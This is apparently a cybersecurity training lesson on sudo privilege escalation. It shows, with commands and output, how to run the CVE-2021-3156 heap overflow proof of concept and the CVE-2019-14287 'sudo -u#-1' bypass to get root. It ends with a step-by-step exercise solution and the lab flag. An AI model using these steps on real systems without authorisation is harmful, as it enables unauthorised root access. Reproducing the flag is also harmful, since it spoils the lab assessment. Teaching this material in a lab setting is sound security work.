The program `sudo` is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to administrators. It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

One of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

To find out the version of `sudo`, the following command is sufficient:

```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

The interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used for this. We can either download this to a copy of the target system we have created or, if we have an internet connection, to the target system itself.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

When running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

We can find out which version of the operating system we are dealing with using the following command:

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

Next, we specify the respective ID for the version operating system and run the exploit with our payload.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

In fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Thus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```





#### Question

Escalate the privileges and submit the contents of flag.txt as the answer.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* Run command " sudo -l " and youll notice theres permission to use the folder " /bin/ncdu "
* Run command " sudo -u#-1 /bin/ncdu ", the program will open and, if you go to GTFOBins page, theres a binary abuse you can use by just pressing " b " once inside the ncdu and you will have root access
* Go to the root folder and loog for the flag
* HTB{SuD0_e5c4l47i0n_1id}
